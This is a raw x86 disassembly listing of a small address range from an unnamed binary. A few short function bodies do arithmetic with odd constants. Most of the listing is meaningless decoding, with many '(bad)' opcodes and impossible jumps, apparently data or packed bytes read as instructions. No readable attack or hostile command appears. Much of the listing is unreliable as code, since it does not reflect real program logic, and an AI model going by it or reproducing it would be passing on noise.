  414934:	mov    ebx,0xec7dd2e7
  414939:	in     eax,0xa
  41493b:	gs mov bh,0xdd
  41493e:	fist   DWORD PTR [ecx]
  414940:	mov    dl,ah
  414942:	mov    eax,ds:0x1049da0d
  414947:	jmp    0xeff8:0xb8fc4d8b
  41494e:	(bad)  
  41494f:	dec    DWORD PTR [ebx+0x3d12bd0]
  414955:	push   ebp
  414956:	clc    
  414957:	mov    ecx,DWORD PTR [ebp-0xc]
  41495a:	or     edx,ecx
  41495c:	mov    ecx,DWORD PTR [ebp-0x4]
  41495f:	imul   edx,edx,0x85300
  414965:	sub    eax,ecx
  414967:	add    eax,DWORD PTR [ebp-0x8]
  41496a:	mov    ecx,DWORD PTR [ebp-0xc]
  41496d:	or     eax,ecx
  41496f:	mov    ecx,DWORD PTR [ebp+0x8]
  414972:	mov    ecx,DWORD PTR [edx+ecx*1+0x1c323f3c]
  414979:	add    eax,0x40e5
  41497e:	imul   eax,eax,0x214c
  414984:	jmp    0x414d49
  414989:	retf   0x46a0
  41498c:	mov    ds:0xa02a1a22,al
  414991:	pop    es
  414992:	inc    ecx
  414993:	repnz push 0x4f
  414996:	ret    0x6a06
  414999:	mov    ebx,DWORD PTR [eax+ebx*1]
  41499c:	sbb    al,dl
  41499e:	adc    bl,BYTE PTR [eax]
  4149a0:	sbb    BYTE PTR [edi-0x25d7264d],ah
  4149a6:	push   ss
  4149a7:	push   0xfffffffc
  4149a9:	mov    ebx,0x3d2c8b81
  4149ae:	adc    al,0x28
  4149b0:	dec    edi
  4149b1:	je     0x4149b8
  4149b3:	xchg   ebp,eax
  4149b4:	cmc    
  4149b5:	push   ebp
  4149b6:	push   edx
  4149b8:	add    ebp,ebx
  4149ba:	test   al,0xc7
  4149bc:	(bad)  
  4149bd:	lods   eax,DWORD PTR ds:[esi]
  4149be:	mov    dh,0xd4
  4149c0:	or     eax,0x4e67be56
  4149c5:	sahf   
  4149c6:	call   0xa5eb07d2
  4149cb:	jle    0x414a4b
  4149cd:	inc    esp
  4149ce:	dec    ecx
  4149cf:	pop    ebx
  4149d0:	cmp    eax,DWORD PTR [edx-0x18]
  4149d3:	cmc    
  4149d4:	lods   al,BYTE PTR ds:[esi]
  4149d5:	mov    esp,0xb3efa9db
  4149da:	sti    
  4149db:	and    BYTE PTR [esi+0x70],ch
  4149de:	fnstcw WORD PTR [ebx-0x19]
  4149e1:	fcom   st(7)
  4149e3:	(bad)  
  4149e4:	jbe    0x4149cf
  4149e6:	jge    0x4149f7
  4149e8:	pop    ds
  4149e9:	and    bh,BYTE PTR [edi]
  4149eb:	mov    bh,0xd
  4149ed:	jno    0x4149b5
  4149ef:	mov    ebx,0xc95be2a9
  4149f4:	cdq    
  4149f5:	pop    ss
  4149f6:	fiadd  DWORD PTR [esi-0x71]
  4149f9:	(bad)  
  4149fb:	lods   eax,DWORD PTR ds:[esi]
  4149fc:	je     0x4149f3
  4149fe:	jns    0x4149f2
  414a00:	call   0x839b4af2
  414a05:	(bad)  
  414a06:	stc    
  414a07:	sub    BYTE PTR [edi],bl
  414a09:	pop    ebx
  414a0a:	(bad)  
  414a0b:	sar    DWORD PTR [edi],cl
  414a0d:	(bad)  
  414a0e:	es aad 0x91
  414a11:	jmp    FWORD PTR [eax-0xbaee3bd]
  414a17:	ins    DWORD PTR es:[edi],dx
  414a18:	lahf   
  414a19:	rcr    DWORD PTR [ebp+0x18],0x85
  414a1d:	sbb    al,0xc1
  414a1f:	mov    dh,0x21
  414a21:	sub    edi,DWORD PTR [ecx+0x983704a]
  414a27:	fmul   QWORD PTR [ebp-0x3644d258]
  414a2d:	jmp    0x414aa0
  414a2f:	cwde   
  414a30:	sub    ebp,esi
  414a32:	stos   BYTE PTR es:[edi],al
  414a33:	repz jg 0x414ab4
  414a36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a37:	sbb    eax,0xafa74dcc
  414a3c:	pop    ss
  414a3d:	and    ebp,DWORD PTR ds:0xf4e77b52
  414a43:	add    ebx,ecx
  414a45:	fwait
  414a46:	or     edx,DWORD PTR [ebp+0x42a39692]
  414a4c:	dec    esi
  414a4d:	pop    ebp
  414a4e:	jns    0x4149d9
  414a50:	adc    esi,DWORD PTR [edi+edi*8-0x4d]
  414a54:	lea    esi,[eax]
  414a56:	lahf   
  414a57:	sahf   
  414a58:	ds addr16 sbb ah,al
  414a5c:	jbe    0x414ab1
  414a5e:	cmp    al,BYTE PTR [edx-0x6e001501]
  414a64:	mov    ds:0x8b659682,al
  414a69:	ins    BYTE PTR es:[edi],dx
  414a6a:	sahf   
  414a6b:	push   ebx
  414a6c:	mov    ds:0x26600683,al
  414a71:	out    0xc5,eax
  414a73:	jno    0x414a26
  414a75:	push   0xd
  414a77:	and    eax,0x44daedb8
  414a7c:	pop    edi
  414a7d:	cmp    al,0xf
  414a7f:	or     ch,BYTE PTR [esi+0x15369d63]
  414a85:	mov    al,ds:0xc820a444
  414a8a:	loop   0x414a9f
  414a8c:	jge    0x414ae4
  414a8e:	mov    gs:0x43fbaeab,eax
  414a94:	sbb    dh,BYTE PTR [edi-0x1c246b4d]
  414a9a:	cmp    edi,DWORD PTR [ebp+ebx*2-0x3b1586e5]
  414aa1:	xchg   edx,eax
  414aa2:	sbb    al,0xd2
  414aa4:	scas   eax,DWORD PTR es:[edi]
  414aa5:	rcr    al,cl
  414aa7:	adc    cl,BYTE PTR [eax]
  414aa9:	push   0x531f567e
  414aae:	or     DWORD PTR [ebp-0x62fa47a2],esp
  414ab4:	mov    ecx,0x75113c5b
  414ab9:	jmp    0x414aa5
  414abb:	arpl   WORD PTR [ecx+0x6b3508cf],bp
  414ac1:	das    
  414ac2:	aam    0xb3
  414ac4:	dec    ebp
  414ac5:	addr16 test eax,0xc97a420c
  414acb:	adc    eax,0xc4d14618
  414ad0:	xchg   eax,edi
  414ad2:	or     cl,cl
  414ad4:	fwait
  414ad5:	add    DWORD PTR [esi-0x75],esi
  414ad8:	sub    DWORD PTR [edi],edi
  414ada:	inc    edi
  414adb:	sbb    edx,0xffffff88
  414ade:	hlt    
  414adf:	mov    dl,0xdb
  414ae1:	pop    ds
  414ae2:	aad    0x77
  414ae4:	pop    edx
  414ae5:	xchg   DWORD PTR [ecx+0x7345f5bd],esp
  414aeb:	repz test DWORD PTR [ecx-0x1c],0xc5dd8390
  414af3:	lods   al,BYTE PTR ds:[esi]
  414af4:	and    BYTE PTR [ebx],dl
  414af6:	call   0x36c246bb
  414afb:	sub    DWORD PTR ds:0x961f90d7,esp
  414b01:	jo     0x414abd
  414b03:	jmp    0x1d0e9834
  414b08:	add    DWORD PTR [edi],edx
  414b0a:	jge    0x414b76
  414b0c:	mov    dh,0x32
  414b0e:	jne    0x414b6d
  414b10:	add    ebx,DWORD PTR [eax-0x26]
  414b13:	sbb    cl,BYTE PTR [esi-0x43]
  414b16:	xchg   edi,eax
  414b17:	mov    ecx,0xdbd93711
  414b1c:	ja     0x414b79
  414b1e:	call   0x88d70dc8
  414b23:	mov    esi,0x8a4e3bd1
  414b28:	mov    eax,0xd61f803d
  414b2d:	test   al,ch
  414b2f:	cmp    al,0xe2
  414b31:	xor    al,BYTE PTR [edi]
  414b33:	call   0xcec8d9db
  414b38:	add    ah,BYTE PTR [edi+0xb]
  414b3b:	mov    dl,0x94
  414b3d:	add    cl,BYTE PTR [edi]
  414b3f:	sbb    eax,0xf4c9f142
  414b44:	or     DWORD PTR [edx+0x45da3d5d],ebx
  414b4a:	cs inc edx
  414b4c:	cdq    
  414b4d:	push   ebx
  414b4e:	or     bh,ch
  414b50:	push   eax
  414b51:	lods   eax,DWORD PTR ds:[esi]
  414b52:	imul   ebp,DWORD PTR [edx+0x1f],0xb
  414b56:	fcomp  DWORD PTR [edx-0x5e90c71]
  414b5c:	sahf   
  414b5d:	lods   eax,DWORD PTR ds:[esi]
  414b5e:	xchg   ebx,eax
  414b5f:	mov    ebx,0x8245d261
  414b64:	stos   DWORD PTR es:[edi],eax
  414b65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b66:	dec    ebx
  414b67:	in     al,dx
  414b68:	loope  0x414b3f
  414b6a:	sbb    esi,DWORD PTR [edi]
  414b6c:	cmp    ebx,ebp
  414b6e:	pop    es
  414b6f:	mov    cl,0x39
  414b71:	leave  
  414b72:	or     BYTE PTR [edx],bh
  414b74:	pop    ebx
  414b75:	pop    edi
  414b76:	imul   esi,DWORD PTR [edx+edx*4+0x6807d676],0x50
  414b7e:	mov    bh,0x63
  414b80:	cld    
  414b81:	inc    ebp
  414b82:	sbb    cl,dh
  414b84:	out    0x53,eax
  414b86:	lods   al,BYTE PTR ds:[esi]
  414b87:	add    ebp,DWORD PTR [eiz*8+0x66356589]
  414b8e:	or     al,0x1a
  414b90:	ds cwde 
  414b92:	inc    ebx
  414b93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b94:	pop    ebp
  414b95:	bound  eax,QWORD PTR [ebp+0x46d2213c]
  414b9b:	push   ecx
  414b9c:	pop    es
  414b9d:	hlt    
  414b9e:	jecxz  0x414b71
  414ba0:	xchg   ebp,eax
  414ba1:	push   ds
  414ba2:	or     esi,DWORD PTR [eax+eiz*8+0x1]
  414ba6:	pop    ecx
  414ba7:	jbe    0x414b66
  414ba9:	or     BYTE PTR [edi],al
  414bab:	mov    eax,ds:0x9c6ef240
  414bb0:	sub    ebx,DWORD PTR [esi+0x3211080f]
  414bb6:	pop    esi
  414bb7:	jnp    0x414b66
  414bb9:	mov    esp,ebx
  414bbb:	iret   
  414bbc:	jecxz  0x414bf6
  414bbe:	push   esi
  414bbf:	or     BYTE PTR [ebp+0x14],ch
  414bc2:	ins    DWORD PTR es:[edi],dx
  414bc3:	push   ecx
  414bc4:	push   cs
  414bc5:	or     DWORD PTR [edi-0x12],eax
  414bc8:	push   eax
  414bc9:	sti    
  414bca:	lahf   
  414bcb:	xchg   edx,eax
  414bcc:	and    edx,DWORD PTR [ebp+edi*8-0x59]
  414bd0:	lods   al,BYTE PTR ds:[si]
  414bd2:	(bad)  
  414bd3:	mov    esp,edi
  414bd5:	jg     0x414c23
  414bd7:	jb     0x414c34
  414bd9:	lds    eax,FWORD PTR [eax]
  414bdb:	ret    0x448b
  414bde:	into   
  414bdf:	dec    eax
  414be0:	repnz mov bl,0xc0
  414be3:	sbb    BYTE PTR [ebx+edx*2-0x45aefdc3],bl
  414bea:	jmp    0x5710db6f
  414bef:	inc    esi
  414bf0:	les    ebp,FWORD PTR [edx]
  414bf2:	fst    QWORD PTR [eax+0x3c246c3d]
  414bf8:	(bad)  
  414bf9:	xchg   edx,eax
  414bfa:	imul   BYTE PTR [esi-0x6c]
  414bfd:	not    BYTE PTR [eax]
  414bff:	in     al,dx
  414c00:	jae    0x414bb8
  414c02:	test   eax,0xe5789106
  414c07:	dec    edi
  414c08:	mov    edi,0x1e8ba17
  414c0d:	lahf   
  414c0e:	xchg   esi,eax
  414c0f:	xchg   BYTE PTR [edx],cl
  414c11:	cmp    al,0xb5
  414c13:	mov    edi,0xd38adce7
  414c18:	xchg   esi,eax
  414c19:	cmp    DWORD PTR [ebx*1-0x3b50dead],esp
  414c20:	shl    al,1
  414c22:	cmp    al,0x7b
  414c24:	and    esi,DWORD PTR [eax]
  414c26:	daa    
  414c27:	jns    0x414c4c
  414c29:	neg    DWORD PTR [edi]
  414c2b:	jne    0x414c44
  414c2d:	inc    edi
  414c2e:	into   
  414c2f:	(bad)  
  414c31:	dec    esp
  414c32:	test   BYTE PTR [ebx],0xe9
  414c35:	mov    ds:0xbb8e6820,eax
  414c3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c3b:	pop    edx
  414c3c:	lods   al,BYTE PTR ds:[esi]
  414c3d:	add    DWORD PTR [ecx+0x7045078c],ebp
  414c43:	and    BYTE PTR [edx+0x1c743ef],al
  414c49:	and    ecx,DWORD PTR [edx+0x580db96]
  414c4f:	and    al,0x2b
  414c51:	pop    ebx
  414c52:	jg     0x414bf9
  414c54:	push   0x23873902
  414c59:	mov    edi,0xfb574769
  414c5e:	jne    0x414cb5
  414c60:	jmp    0xe4dc:0xd23d5dd9
  414c67:	pop    edi
  414c68:	xor    bl,al
  414c6a:	mov    ecx,0xb5214e4c
  414c6f:	cmp    DWORD PTR [ecx+ecx*2],esi
  414c72:	test   BYTE PTR [eax+ecx*2-0x59],cl
  414c76:	mov    eax,ds:0xd8b71b9f
  414c7b:	sub    DWORD PTR [edx+esi*4],0x57fa9e73
  414c82:	int3   
  414c83:	sbb    BYTE PTR [ecx+0x6da859f],0x4a
  414c8a:	sub    DWORD PTR [ebx+ebx*2-0x46],0x3a2f214d
  414c92:	cmp    esp,DWORD PTR [ebx+0x7a610baf]
  414c98:	adc    BYTE PTR [esi*4-0x215b1754],0xb8
  414ca0:	push   0x1509250a
  414ca5:	stos   DWORD PTR es:[edi],eax
  414ca6:	jle    0x414cf1
  414ca8:	aaa    
  414ca9:	jge    0x414c2b
  414cab:	add    BYTE PTR [ebx],bh
  414cad:	mov    dh,0xca
  414caf:	push   eax
  414cb0:	cld    
  414cb1:	rol    BYTE PTR ss:[eax],cl
  414cb4:	cwde   
  414cb5:	cmp    ebx,DWORD PTR [eax]
  414cb7:	push   ebx
  414cb8:	adc    DWORD PTR [edi],esp
  414cba:	stos   DWORD PTR es:[edi],eax
  414cbb:	xor    cl,BYTE PTR [ecx]
  414cbd:	xchg   ebx,eax
  414cbe:	inc    esi
  414cbf:	rcr    DWORD PTR [ebx],0x85
  414cc2:	dec    ebp
  414cc3:	aam    0x3d
  414cc5:	mov    dh,0x24
  414cc7:	mov    DWORD PTR [esi],ecx
  414cc9:	xchg   bh,ah
  414ccb:	icebp  
  414ccc:	(bad)  
  414cce:	loop   0x414cb1
  414cd0:	mov    dl,0xae
  414cd2:	ins    BYTE PTR es:[edi],dx
  414cd3:	hlt    
  414cd4:	(bad)  
  414cd5:	xor    ah,BYTE PTR [eax+0x4cbc63a]
  414cdb:	cmp    ebp,DWORD PTR [eax+0x698f5f96]
  414ce1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ce2:	pop    eax
  414ce3:	mov    ebp,DWORD PTR [edi-0x38e9b4ea]
  414ce9:	dec    ecx
  414cea:	test   DWORD PTR [ecx],edi
  414cec:	outs   dx,BYTE PTR ds:[esi]
  414ced:	ficom  WORD PTR [ebp+0xdaf5688]
  414cf3:	or     eax,0x3b26679e
  414cf8:	(bad)  
  414cf9:	out    0x48,eax
  414cfb:	push   esi
  414cfc:	pop    ecx
  414cfd:	test   al,dh
  414cff:	sub    eax,0xb882014b
  414d04:	es xchg ebp,eax
  414d06:	pop    esi
  414d07:	enter  0xab1,0x62
  414d0b:	stc    
  414d0c:	cmp    BYTE PTR [ecx+0x5e3c01b9],dl
  414d12:	add    edi,ecx
  414d14:	pushf  
  414d15:	dec    ecx
  414d16:	loopne 0x414d2c
  414d18:	fisttp DWORD PTR [ebx]
  414d1a:	cmp    DWORD PTR [edi+0x4a985664],ebp
  414d20:	push   ss
  414d21:	cmp    esi,ebp
  414d23:	test   al,0x5
  414d25:	retf   
  414d26:	(bad)  
  414d28:	pop    edi
  414d29:	mul    BYTE PTR [edx]
  414d2b:	or     BYTE PTR [edi],0xbe
  414d2e:	out    0xb8,eax
  414d30:	add    BYTE PTR [ebp+0x11c0cc0b],ch
  414d36:	adc    DWORD PTR [esp+esi*4],ebx
  414d39:	xchg   BYTE PTR [edx+edx*4+0x38],dh
  414d3d:	iret   
  414d3e:	mov    DWORD PTR [eax+0x4bd80d62],edx
  414d44:	repz loope 0x414cde
  414d47:	adc    ebp,DWORD PTR [ecx+0x4d8bc103]
  414d4d:	or     BYTE PTR [ebx],al
  414d4f:	enter  0x4d89,0x8
  414d53:	mov    eax,DWORD PTR [ebp-0x24]
  414d56:	mov    ecx,DWORD PTR [ebp-0x28]
  414d59:	and    eax,ecx
  414d5b:	mov    ecx,DWORD PTR [ebp-0x2c]
  414d5e:	and    eax,ecx
  414d60:	mov    ecx,DWORD PTR [ebp-0x30]
  414d63:	imul   eax,ecx
  414d66:	mov    ecx,DWORD PTR [ebp-0x34]
  414d69:	or     eax,ecx
  414d6b:	mov    ecx,DWORD PTR [ebp-0x38]
  414d6e:	imul   eax,ecx
  414d71:	mov    ecx,DWORD PTR [ebp+0x8]
  414d74:	sub    eax,0x777ea653
  414d79:	cmp    DWORD PTR [ecx+0x54],eax
  414d7c:	je     0x414d8a
  414d82:	mov    eax,DWORD PTR [ebp+0x8]
  414d85:	jmp    0x414dd1
  414d8a:	mov    eax,DWORD PTR [ebp-0x3c]
  414d8d:	sub    eax,0x5258
  414d92:	xor    eax,0x49e9
  414d97:	add    eax,0x253
  414d9c:	jmp    0x414dd1
  414da1:	mov    DWORD PTR [ebp-0x3c],0x4177
  414da8:	mov    DWORD PTR [ebp+0x8],0x1405
  414daf:	mov    eax,DWORD PTR [ebp+0x8]
  414db2:	mov    ecx,DWORD PTR [ebp-0x3c]
  414db5:	imul   eax,eax,0x58cc
  414dbb:	add    eax,0x3f39
  414dc0:	and    eax,ecx
  414dc2:	add    eax,0x3b90
  414dc7:	or     eax,0x4b1c
  414dcc:	sub    eax,0x7fdd
  414dd1:	leave  
  414dd2:	ret    0x4
  414dd5:	push   ebp
  414dd6:	mov    ebp,esp
  414dd8:	and    esp,0xfffffff8
  414ddb:	sub    esp,0x20
  414dde:	push   ebx
  414ddf:	push   esi
  414de0:	lea    eax,[esp+0x10]
  414de4:	mov    DWORD PTR [esp+0xc],eax
  414de8:	mov    eax,DWORD PTR [esp+0xc]
  414dec:	mov    ecx,DWORD PTR [esp+0x10]
  414df0:	jmp    0x4151d4
  414df5:	sbb    eax,0x1afa8288
  414dfa:	cli    
  414dfb:	sbb    al,0x26
  414dfd:	retf   0xbdbd
  414e00:	mov    al,0x51
  414e02:	adc    bl,0xbc
  414e05:	inc    edx
  414e06:	push   ss
  414e07:	push   ss
  414e08:	sbb    BYTE PTR [edx-0x5ee7e7ee],dl
  414e0e:	mov    dl,0x7
  414e10:	loope  0x414de4
  414e12:	(bad)  
  414e13:	pop    ebx
  414e14:	xchg   ecx,eax
  414e15:	rcl    BYTE PTR [edi-0x79f8898],1
  414e1b:	in     eax,0x88
  414e1d:	mov    ah,0x56
  414e1f:	fst    QWORD PTR [esi-0x4b]
  414e22:	lods   eax,DWORD PTR ds:[esi]
  414e23:	sbb    al,0xa0
  414e25:	and    eax,esi
  414e27:	jmp    0x8336:0xad7817cf
  414e2e:	mov    edx,0xade56ef2
  414e33:	jnp    0x414dfe
  414e35:	dec    ebx
  414e36:	test   eax,0x184e1d7a
  414e3b:	and    bh,BYTE PTR [ebp-0x31aef1b9]
  414e41:	sbb    eax,0x46a6f1d0
  414e46:	fist   DWORD PTR [ebp-0x2ab08cca]
  414e4c:	mov    eax,0x2cce62b6
  414e51:	fs std 
  414e53:	or     cl,BYTE PTR [edx-0x30702026]
  414e59:	push   eax
  414e5a:	lock out 0xd7,eax
  414e5d:	cmc    
  414e5e:	cld    
  414e5f:	outs   dx,BYTE PTR ds:[esi]
  414e60:	cmp    esp,DWORD PTR ds:0x8d63f910
  414e66:	and    BYTE PTR [edi],0xec
  414e69:	outs   dx,BYTE PTR ds:[esi]
  414e6a:	lds    esi,FWORD PTR [ecx+0x5e]
  414e6d:	mov    ch,0x72
  414e6f:	cdq    
  414e70:	out    0x36,eax
  414e72:	out    0xcf,eax
  414e74:	bound  ebx,QWORD PTR [ebx-0x42a3e72]
  414e7a:	xor    DWORD PTR [edx+edx*1],0x7f
  414e7e:	out    dx,al
  414e7f:	inc    esp
  414e80:	leave  
  414e81:	es (bad) 
  414e83:	fisttp WORD PTR [ecx+0x3477be3d]
  414e89:	mov    ah,BYTE PTR [edi]
  414e8b:	dec    ebx
  414e8c:	mov    edi,0x324c4936
  414e91:	lods   eax,DWORD PTR ds:[esi]
  414e92:	int    0xdb
  414e94:	aas    
  414e95:	xor    DWORD PTR [esi],ebx
  414e97:	pop    edi
  414e98:	gs xchg edx,eax
  414e9a:	inc    ebx
  414e9b:	inc    DWORD PTR [esi+0x45]
  414e9e:	pop    edx
  414e9f:	cmp    DWORD PTR es:[edi-0x7709fedc],edi
  414ea6:	aas    
  414ea7:	mov    cl,0x37
  414ea9:	out    0x58,al
  414eab:	jo     0x414efe
  414ead:	pop    ss
  414eae:	adc    DWORD PTR [ebx],eax
  414eb0:	mov    ebx,eax
  414eb2:	jecxz  0x414ee1
  414eb4:	loopne 0x414f0b
  414eb6:	pusha  
  414eb7:	xchg   esi,eax
  414eb8:	iret   
  414eb9:	jle    0x414f0a
  414ebb:	into   
  414ebc:	retf   
  414ebd:	or     edi,eax
  414ebf:	mov    edi,0xf9224cc6
  414ec5:	dec    esp
  414ec6:	lods   al,BYTE PTR ds:[esi]
  414ec7:	or     bl,BYTE PTR [ebp-0x34d50c39]
  414ecd:	sub    BYTE PTR [ecx],0xb5
  414ed0:	lock jb 0x414f28
  414ed3:	xchg   ecx,eax
  414ed4:	inc    eax
  414ed5:	out    0x5,eax
  414ed7:	mov    ah,0x95
  414ed9:	loope  0x414ef0
  414edb:	mov    WORD PTR [ebx+0x4c],gs
  414ede:	fild   DWORD PTR [edi]
  414ee0:	rcr    ebp,1
  414ee2:	or     dl,0xd3
  414ee5:	out    dx,eax
  414ee6:	out    0xfe,eax
  414ee8:	adc    edx,ebx
  414eea:	xchg   esp,eax
  414eeb:	mov    ch,0xd0
  414eed:	cwde   
  414eee:	shl    BYTE PTR [esi+0x1c],1
  414ef1:	cld    
  414ef2:	mov    ds:0x9cad6d5a,al
  414ef7:	cmp    DWORD PTR [edx+0x4a7bb17e],ecx
  414efd:	mov    WORD PTR [ecx+0x4c],?
  414f00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f01:	pop    esi
  414f02:	inc    ebp
  414f03:	test   al,0x29
  414f05:	loop   0x414f53
  414f07:	arpl   WORD PTR [edx-0x72],dx
  414f0a:	add    DWORD PTR [esi],esi
  414f0c:	fs je  0x414f0c
  414f0f:	push   ss
  414f10:	and    al,0x44
  414f12:	mov    dl,BYTE PTR [edi-0x59ceaa]
  414f18:	pop    ebp
  414f19:	xchg   DWORD PTR [ecx],edx
  414f1b:	das    
  414f1c:	retf   0x2a75
  414f1f:	and    BYTE PTR [ebp+0x53ea5e7c],bh
  414f25:	mov    edi,0xa095de8d
  414f2a:	out    dx,al
  414f2b:	icebp  
  414f2c:	ins    BYTE PTR es:[edi],dx
  414f2d:	cmp    esi,DWORD PTR [edi+0x32]
  414f30:	rcl    BYTE PTR [edx+edi*4],0x59
  414f34:	stc    
  414f35:	xor    eax,0x65c70ddc
  414f3a:	add    BYTE PTR [edi-0x76b215a1],dl
  414f40:	lds    esp,FWORD PTR [eax+ecx*8+0x1b229a29]
  414f47:	pop    edi
  414f48:	out    dx,eax
  414f49:	mov    edi,0xe84793e
  414f4e:	pop    esi
  414f4f:	sbb    BYTE PTR [edx+0x48],0x96
  414f53:	inc    edx
  414f54:	inc    eax
  414f55:	add    al,0xdd
  414f57:	jl     0x414f1f
  414f59:	xchg   DWORD PTR [edi],edx
  414f5b:	nop
  414f5c:	and    esi,DWORD PTR [eax+0x8]
  414f5f:	fs out 0x5c,eax
  414f62:	enter  0x43d2,0xe1
  414f66:	dec    esi
  414f67:	aad    0xf0
  414f69:	add    DWORD PTR [edx],ebp
  414f6b:	ss jo  0x414f95
  414f6e:	test   DWORD PTR [esi+eax*1],edx
  414f71:	sahf   
  414f72:	pop    edi
  414f73:	jo     0x414fc4
  414f75:	out    0xc3,al
  414f77:	xor    DWORD PTR ds:0x88a0aeba,esi
  414f7d:	and    edx,eax
  414f7f:	pop    ecx
  414f80:	dec    edx
  414f81:	or     dh,BYTE PTR [ecx-0x80]
  414f84:	mov    ds:0x7770d97a,al
  414f89:	ret    0xb347
  414f8c:	jae    0x414fee
  414f8e:	repnz dec edi
  414f90:	xchg   ebp,eax
  414f91:	test   al,0xb7
  414f93:	adc    BYTE PTR cs:[edi+0x265f16e1],ch
  414f9a:	add    al,0x31
  414f9c:	xor    al,0x2a
  414f9e:	xor    al,0xca
  414fa0:	enter  0x494,0x85
  414fa4:	xchg   bp,ax
  414fa6:	jb     0x414f55
  414fa8:	fs addr16 push 0xffffffe3
  414fac:	out    0xfb,eax
  414fae:	aad    0x6a
  414fb0:	fucomp st(4)
  414fb2:	xlat   BYTE PTR ds:[ebx]
  414fb3:	sbb    BYTE PTR [eax],bh
  414fb5:	pop    es
  414fb6:	loop   0x414f85
  414fb8:	add    BYTE PTR [edi-0x62],al
  414fbb:	or     eax,0x73c084b0
  414fc0:	daa    
  414fc1:	das    
  414fc2:	push   ss
  414fc3:	cdq    
  414fc4:	jg     0x414f59
  414fc6:	and    al,0xd5
  414fc8:	cmp    al,0x42
  414fca:	rol    DWORD PTR [eax],1
  414fcc:	or     eax,0xde7a859c
  414fd1:	push   edx
  414fd2:	daa    
  414fd3:	(bad)  
  414fd4:	push   esi
  414fd5:	push   esi
  414fd6:	xor    eax,0x8922bb0b
  414fdb:	dec    ebp
  414fdc:	cmp    eax,0x2e0f3de1
  414fe1:	sub    esp,edx
  414fe3:	ins    DWORD PTR es:[edi],dx
  414fe4:	(bad)  
  414fe5:	repnz test al,0xd0
  414fe8:	mov    eax,0xdeb0ff01
  414fed:	mov    ecx,0x76dbf3c4
  414ff2:	cli    
  414ff3:	xchg   BYTE PTR [eax+0x6f51e492],cl
  414ff9:	jo     0x415072
  414ffb:	push   0x27817602
  415000:	pop    ebp
  415001:	xor    ebx,DWORD PTR [ebx+ecx*8+0x584fd408]
  415008:	rol    DWORD PTR [edi],1
  41500a:	sbb    BYTE PTR [ebx],ch
  41500c:	(bad)  
  41500e:	dec    cl
  415010:	xchg   esi,eax
  415011:	int3   
  415012:	push   ebp
  415013:	push   cs
  415014:	std    
  415015:	mov    bh,0xa8
  415017:	dec    ebp
  415018:	sbb    BYTE PTR [edi+0x76fd4d7c],dl
  41501e:	pop    es
  41501f:	push   ds
  415020:	scas   al,BYTE PTR es:[edi]
  415021:	add    ebx,DWORD PTR [esi+eiz*8+0x537251c3]
  415028:	jl     0x415044
  41502a:	cmp    dl,BYTE PTR [esi]
  41502c:	cwde   
  41502d:	std    
  41502e:	cdq    
  41502f:	js     0x414ffb
  415031:	rcl    BYTE PTR [eax-0x1a],cl
  415034:	into   
  415035:	clc    
  415036:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415037:	sbb    eax,0x716dd20c
  41503c:	(bad)  
  41503d:	jle    0x415061
  41503f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415040:	sbb    DWORD PTR [esp+esi*2-0x6ef74e7],0x68071257
  41504b:	icebp  
  41504c:	cmc    
  41504d:	dec    eax
  41504e:	icebp  
  41504f:	sbb    ebp,ebp
  415051:	lods   al,BYTE PTR ds:[esi]
  415052:	sub    BYTE PTR [ecx],cl
  415054:	sub    DWORD PTR [esi+0x75],edx
  415057:	test   al,0xa9
  415059:	outs   dx,DWORD PTR ds:[esi]
  41505a:	jle    0x41507e
  41505c:	xlat   BYTE PTR ds:[ebx]
  41505d:	mov    esi,0x453091eb
  415062:	sub    al,0xbf
  415064:	out    dx,al
  415065:	mov    dl,0x85
  415067:	xchg   edi,eax
  415068:	adc    edx,esi
  41506a:	bound  esp,QWORD PTR [edi]
  41506c:	imul   ebx,DWORD PTR [esi+eax*4],0xffffffa0
  415070:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415071:	clc    
  415072:	jmp    0x415075
  415074:	scas   al,BYTE PTR es:[edi]
  415075:	dec    eax
  415076:	adc    al,0xe3
  415078:	gs das 
  41507a:	fisub  DWORD PTR [ebx+0x45a93e1c]
  415080:	test   edx,edi
  415082:	mov    fs,WORD PTR [ecx-0x9cef7b5]
  415088:	pop    edi
  415089:	fs lahf 
  41508b:	mov    edx,0x1b56216f
  415090:	(bad)  
  415091:	cld    
  415092:	adc    edi,edx
  415094:	mov    ah,0xa7
  415096:	jo     0x415105
  415098:	data16 cmp al,0x99
  41509b:	pop    es
  41509c:	out    dx,al
  41509d:	xor    DWORD PTR [esi+eiz*2],ebx
  4150a0:	lock mov BYTE PTR [esi],al
  4150a3:	adc    eax,0xcc323312
  4150a8:	fwait
  4150a9:	xor    al,0x19
  4150ab:	pop    esi
  4150ac:	pop    es
  4150ad:	dec    edi
  4150ae:	inc    edx
  4150af:	pop    ebx
  4150b0:	daa    
  4150b1:	int3   
  4150b2:	loopne 0x415063
  4150b4:	xchg   BYTE PTR [ecx-0x6a6bbdbf],bh
  4150ba:	cs enter 0xd394,0x45
  4150bf:	clc    
  4150c0:	sbb    dh,dl
  4150c2:	lahf   
  4150c3:	mov    ch,0x28
  4150c5:	or     DWORD PTR [ebx+0xb],edx
  4150c8:	dec    esp
  4150c9:	sbb    eax,0x6dfc6184
  4150ce:	pop    ss
  4150cf:	mov    WORD PTR [ebx-0x17b38abd],ds
  4150d5:	inc    esi
  4150d6:	ins    BYTE PTR es:[edi],dx
  4150d7:	mov    ah,0xc1
  4150d9:	xchg   esi,eax
  4150da:	imul   ebx,DWORD PTR [ecx],0x7d2d2768
  4150e0:	push   cs
  4150e1:	dec    edx
  4150e2:	(bad)  
  4150e3:	ins    BYTE PTR es:[edi],dx
  4150e4:	dec    eax
  4150e5:	adc    al,0x1
  4150e7:	nop
  4150e8:	aaa    
  4150e9:	and    dl,dh
  4150eb:	sbb    eax,0x5c022280
  4150f0:	fistp  WORD PTR [ebx]
  4150f2:	clc    
  4150f3:	mov    al,0x86
  4150f5:	mov    al,BYTE PTR [edi]
  4150f7:	ja     0x415103
  4150f9:	sti    
